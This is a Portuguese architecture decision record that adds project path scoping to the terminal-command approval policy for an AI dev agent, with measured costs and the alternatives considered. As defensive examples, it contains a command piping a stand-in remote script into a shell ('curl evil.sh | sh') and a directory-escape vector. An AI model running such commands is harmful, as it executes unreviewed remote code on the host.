# ADR 0055 — Escopo de caminho na política de terminal

## Status

Aceito — implementado e provado por teste na Fase F do backlog.

Uma correção do que este documento dizia, feita ANTES do aceite e não depois:
a decisão original falava em `realpath`. A implementação normaliza
**lexicamente** (`posix.normalize`), porque `decide()` é puro por contrato —
"zero IO" — e resolver link simbólico exigiria tocar o sistema de arquivos
dentro do domínio. O léxico mata o vetor que a decisão descreve (`<raiz>/../..`
começa com a raiz e sai dela) e deixa um em aberto: symlink DENTRO do projeto
apontando para fora não é detectado. Fechar esse é isolamento, não política —
a mesma metade que a seção de consequências já declara fora de escopo.

## Contexto

A escada de aprovação de `terminal` é inviável na prática, e isto foi **medido**,
não sentido. Na sessão `1f94de49` do projeto `hello-limpo`, com o dev agent real
e modelo de API:

| medida | valor |
|---|---|
| ações propostas | 14 |
| turnos do dev agent | 15 |
| tokens de entrada / saída | 209.031 / 4.546 |
| custo do dev agent | US$ 0,0196 |
| **linhas escritas para a task** | **0** |

A task era "Expor rota GET pública /api/saudacao". Nenhuma linha saiu porque
praticamente todo turno terminou esperando um clique.

### Por que TODO comando pede aprovação

Dois defeitos independentes, ambos verificados no código e no arquivo vivo.

**1. O `cd` reprova o comando inteiro.** Um comando composto só é
`auto_approve` quando TODOS os segmentos casam em `allow`
(`apps/api/src/domain/actions/decide.ts:201`, `perSegment.every(...)`) — regra
correta, que é o que impede `pnpm test && curl evil.sh | sh` de passar pela
primeira metade. Mas o dev agent emite sempre `cd <caminho> && <verbo>`, e `cd`
não está em `DEV_TERMINAL_ALLOW_PATTERNS`. O verbo (`cat`, `find`, `ls`) está
liberado; o `cd` na frente derruba tudo. Na prática o allow semeado quase nunca
é alcançado.

**2. "Sempre permitir" não permite quase nada.** Ele grava o **comando literal
inteiro** como padrão. Do `permissions.json` real do `hello-limpo`:

```
"Terminal(cd /data/project-workspaces/9c7c84f0-…/.worktrees/dev-http-api && find . -type f | head -50; echo \"---docs---\"; ls -la docs .github; echo \"---\"; cat .git 2>/dev/null)"
```

O casamento é por prefixo de **token**
(`apps/api/src/domain/actions/command-matcher.ts:90`), então esse padrão só
voltaria a valer se o modelo reemitisse os mesmos ~200 caracteres. Nunca
acontece. O usuário clica "Sempre permitir" e é perguntado de novo no turno
seguinte — o escape hatch não escapa.

### O que o usuário quer, e não é expressável

A regra pedida é **"sempre, desde que seja na pasta do projeto"**. Hoje isso não
tem como ser escrito: o casamento é por prefixo de token do COMANDO, e
`decide.ts` só tem noção de caminho para `write_file` (whitelist de paths da
Fase 3a), nunca para `terminal`.

### O agravante que a execução expôs

Dentro do executor de terminal, `/workspace` é o **monorepo do próprio Brabo**,
não o worktree do projeto. O worktree é
`/data/project-workspaces/<projectId>/.worktrees/<agentId>`. O dev agent do
`hello-limpo` gastou turnos lendo `apps/engine/mix.exs`, e chegou a propor
`cat lib/engine/actions/git_executor.ex` e
`sed -n '1,120p' lib/engine/dev/context_builder.ex` — o executor de git e o
construtor de contexto da plataforma que o executa.

Ou seja: hoje não existe nenhuma noção de "a pasta do projeto", e o alcance do
agente é maior que o projeto dele. Escopo de caminho não é só ergonomia; é a
fronteira que falta.

## Decisão

Introduzir **escopo de caminho** como estágio da decisão de `terminal`.

1. **O escopo é do projeto.** Cada projeto declara sua raiz —
   `/data/project-workspaces/<projectId>` — e todo worktree de agente vive
   abaixo dela. Um comando é "no escopo" quando o `cwd` efetivo e todo caminho
   absoluto que ele menciona resolvem para dentro dessa raiz.

2. **Resolução por REALPATH, nunca por prefixo de string.** `<raiz>/../..`
   começa com a raiz e sai dela. A comparação é feita sobre o caminho
   normalizado; um `..` que escape reprova. (Esta decisão é consequência direta
   do paliativo aplicado em produção enquanto este ADR era escrito, que usa
   prefixo de string e tem exatamente essa fraqueza.)

3. **Escopo permite, não isenta.** Estar no escopo troca o default de
   `require_approval` para `auto_approve` **apenas para um conjunto declarado de
   verbos de leitura e build** — o mesmo espírito de `DEV_TERMINAL_ALLOW_PATTERNS`
   de hoje. Estar na pasta do projeto não torna `curl … | sh` seguro. Egresso de
   rede, instalação de pacote e verbo fora do conjunto continuam pedindo.

4. **`deny` continua vencendo, sempre e primeiro.** Escopo nunca reverte um
   `deny`, nem os padrões embutidos, nem os dois tetos (merge em branch
   protegida e `instruction_patch`), que permanecem intocados
   ([RN-006](../business-rules.md#rn-006),
   [RN-007](../business-rules.md#rn-007)).

5. **Fora do escopo é `require_approval`, não `deny`.** O agente pode ter razão
   legítima para olhar fora; quem decide continua sendo o usuário. O que muda é
   que isso vira a exceção rara, em vez da regra.

6. **"Sempre permitir" passa a generalizar.** Em vez do comando literal, grava o
   prefixo de tokens do segmento que motivou a pergunta. Um padrão que nunca
   volta a casar é pior que nenhum: ensina o usuário a desconfiar do botão.

7. **O evento registra o escopo.** A auto-aprovação por escopo grava em
   `proposed_action.created` qual raiz a autorizou, para que a passagem seja
   medível pelo event log, no espírito do
   [ADR 0048](0048-decisao-no-log-e-a-ordem-do-gate.md) e do
   [ADR 0054](0054-gates-como-registro-declarativo.md).

## Consequências

**O que melhora.** A execução deixa de morrer na escada: o agente lê e constrói
dentro do próprio worktree sem interromper o usuário, e o usuário volta a ser
chamado para o que de fato tem efeito — git, rede, gasto, e qualquer coisa fora
do projeto.

**O que se perde.** Deixa de ser verdade que *todo* comando de terminal passa
pelos olhos do usuário. É uma flexibilização real da invariante do CLAUDE.md, e
está sendo tomada de olhos abertos: a alternativa medida é um produto que não
entrega uma linha de código.

**O que este ADR NÃO resolve.** Escopo é **política**, não isolamento. Enquanto
o monorepo do Brabo estiver montado em `/workspace` dentro do container que
executa os comandos, a fronteira depende da política acertar. Isolamento de
verdade (montagem, container por projeto) é outro problema, e fica registrado
aqui como pendência explícita em vez de ser confundido com esta decisão.

**Precondição de processo.** A FASE 13 declara "Nenhuma feature nova e nenhum
fix". Implementar isto exige que esse congelamento seja levantado — decisão do
usuário, registrada aqui porque o ADR não pode se autoautorizar.

## Alternativas consideradas

**Pôr `cd` no `allow`.** Um `Terminal(cd)` solto libera `cd` para qualquer
lugar, inclusive `/workspace`. Resolveria a fricção fazendo exatamente o
contrário da intenção — o alcance ficaria maior, não menor.

**Auto-aprovar `terminal` por `agent_autonomy`.** Já está descartado em
`docs/reference/permissions.md`: liberaria QUALQUER comando dentro do container
do engine, sem o arquivo no meio. É mais largo que o problema.

**Melhorar só o "Sempre permitir".** Generalizar o padrão gravado ajuda (e está
incluído acima), mas sozinho não expressa "na pasta do projeto" — continuaria
sendo permissão por verbo, válida em qualquer diretório.

**Manter como está.** Recusada pela medição no topo deste documento.

## Referências

- [ADR 0052](0052-dev-agent-espera-aprovacao-no-meio-do-laco.md) — o agente
  espera a decisão em vez de queimar iterações; este ADR ataca a causa de haver
  tanta decisão a esperar.
- [RN-004](../business-rules.md#rn-004), [RN-005](../business-rules.md#rn-005),
  [RN-068](../business-rules/custo.md#rn-068),
  [RN-073](../business-rules/custo.md#rn-073).
- `apps/api/src/domain/actions/decide.ts`,
  `apps/api/src/domain/actions/command-matcher.ts`,
  `apps/api/src/domain/actions/dev-terminal-patterns.ts`,
  `apps/api/src/infrastructure/filesystem/fs-permissions-file-store.ts`.
